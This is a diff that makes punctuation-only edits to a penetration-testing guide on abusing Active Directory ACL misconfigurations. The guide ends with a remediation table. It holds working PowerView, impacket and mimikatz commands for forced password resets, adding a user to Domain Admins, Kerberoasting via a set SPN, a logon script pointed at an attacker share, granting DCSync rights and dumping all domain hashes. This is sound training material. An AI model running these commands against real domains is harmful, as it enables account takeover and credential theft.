@@ -2,11 +2,11 @@
 
 ## What Are ACLs in AD?
 
-Every object in Active Directory (users, groups, computers, OUs) has an **Access Control List** — a list of who can do what to it. BloodHound maps these visually. When a user has overpermissive rights on an object, you can abuse those rights to escalate.
+Every object in Active Directory (users, groups, computers, OUs) has an **Access Control List** - a list of who can do what to it. BloodHound maps these visually. When a user has overpermissive rights on an object, you can abuse those rights to escalate.
 
 **This is one of the most common paths BloodHound shows you.** The path often looks like:
 ```
-your user → has GenericAll → some service account → that account has DCSync rights
+your user -> has GenericAll -> some service account -> that account has DCSync rights
 ```
 
 ---
@@ -14,11 +14,11 @@ your user → has GenericAll → some service account → that account has DCSyn
 ## Finding ACL Misconfigurations
 
 ```sh
-# BloodHound — after importing data, run:
+# BloodHound - after importing data, run:
 # "Find Shortest Paths to Domain Admins"
-# Right-click any edge → Help → shows the exact attack
+# Right-click any edge -> Help -> shows the exact attack
 
-# PowerView — enumerate ACLs for your user
+# PowerView - enumerate ACLs for your user
 Get-DomainObjectAcl -Identity "targetuser" -ResolveGUIDs
 Get-DomainObjectAcl -SamAccountName "targetuser" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDacl"}
 
@@ -32,7 +32,7 @@ Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match "yo
 
 You have complete control over the object. Most powerful right.
 
-### On a User — Force Password Reset
+### On a User - Force Password Reset
 ```powershell
 # PowerView
 Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
@@ -41,7 +41,7 @@ Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureSt
 net user targetuser NewPass123! /domain
 ```
 
-### On a Group — Add Yourself
+### On a Group - Add Yourself
 ```powershell
 # PowerView
 Add-DomainGroupMember -Identity "Domain Admins" -Members youruser
@@ -50,7 +50,7 @@ Add-DomainGroupMember -Identity "Domain Admins" -Members youruser
 net group "Domain Admins" youruser /add /domain
 ```
 
-### On a Computer — Resource-Based Constrained Delegation
+### On a Computer - Resource-Based Constrained Delegation
 See [Delegation Attacks](delegation-attacks.md).
 
 ---
@@ -59,7 +59,7 @@ See [Delegation Attacks](delegation-attacks.md).
 
 Can modify certain attributes of the object.
 
-### On a User — Set SPN for Kerberoasting
+### On a User - Set SPN for Kerberoasting
 ```powershell
 # Set an SPN on a user that has no SPN (makes them Kerberoastable)
 Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/NOTHING'}
@@ -71,7 +71,7 @@ GetUserSPNs.py corp.local/youruser:pass -dc-ip <DC-IP> -request
 Set-DomainObject -Identity targetuser -Clear serviceprincipalname
 ```
 
-### On a User — Set logon script (for code execution)
+### On a User - Set logon script (for code execution)
 ```powershell
 Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\evil.ps1'}
 ```
@@ -80,17 +80,17 @@ Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\evil.p
 
 ## WriteDACL
 
-Can modify the ACL of the object — meaning you can grant yourself any permission you want, including GenericAll.
+Can modify the ACL of the object - meaning you can grant yourself any permission you want, including GenericAll.
 
 ```powershell
 # Add GenericAll to yourself on a target object
 Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Rights All
 
-# Now you have GenericAll → use force password reset above
+# Now you have GenericAll -> use force password reset above
 Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
 ```
 
-### WriteDACL on Domain Object → DCSync Rights
+### WriteDACL on Domain Object -> DCSync Rights
 If you have WriteDACL on the **domain object itself**:
 ```powershell
 # Add DCSync rights to your account
@@ -159,7 +159,7 @@ lsadump::dcsync /domain:corp.local /user:Administrator
 
 ## Full Attack Flow Example
 
-BloodHound shows: `jdoe → GenericAll → sqlservice → DCSync → Domain`
+BloodHound shows: `jdoe -> GenericAll -> sqlservice -> DCSync -> Domain`
 
 ```
 Step 1: Reset sqlservice password
@@ -170,7 +170,7 @@ Step 2: Authenticate as sqlservice
 
 Step 3: DCSync from sqlservice
   secretsdump.py corp.local/sqlservice:'Hacked123!'@<DC-IP>
-  → dumps all hashes → you have DA
+  -> dumps all hashes -> you have DA
 ```
 
 ---
@@ -197,10 +197,10 @@ Set-DomainObject -Identity targetuser -Clear serviceprincipalname
 
 | Finding | Remediation |
 |---|---|
-| GenericAll / GenericWrite on user or group | Remove the overpermissive ACE using **Active Directory Users and Computers → Object → Security** or PowerView `Remove-DomainObjectAcl`. Audit who legitimately needs write access. |
-| WriteDACL on domain object (DCSync path) | Remove the ACE immediately — only Domain Admins and specific replication accounts should have replication rights on the domain object. |
+| GenericAll / GenericWrite on user or group | Remove the overpermissive ACE using **Active Directory Users and Computers -> Object -> Security** or PowerView `Remove-DomainObjectAcl`. Audit who legitimately needs write access. |
+| WriteDACL on domain object (DCSync path) | Remove the ACE immediately - only Domain Admins and specific replication accounts should have replication rights on the domain object. |
 | ForceChangePassword on privileged account | Remove the ACE. Implement a formal process for password resets that does not require delegated rights. |
-| WriteOwner anywhere sensitive | Remove the ACE. Audit object ownership across the domain — objects owned by non-admin users are a red flag. |
+| WriteOwner anywhere sensitive | Remove the ACE. Audit object ownership across the domain - objects owned by non-admin users are a red flag. |
 | BloodHound shows paths to DA through ACLs | Run BloodHound **proactively** as a blue team tool (quarterly or after any major AD change). Use **PlumHound** to generate HTML reports of all paths to DA. |
 
-**Key point for reports:** These permissions are invisible without dedicated tooling — no admin sees them in day-to-day operations. The fix is both technical (remove the ACE) and process (regular BloodHound audits so new misconfigurations are caught before attackers find them).
+**Key point for reports:** These permissions are invisible without dedicated tooling - no admin sees them in day-to-day operations. The fix is both technical (remove the ACE) and process (regular BloodHound audits so new misconfigurations are caught before attackers find them).
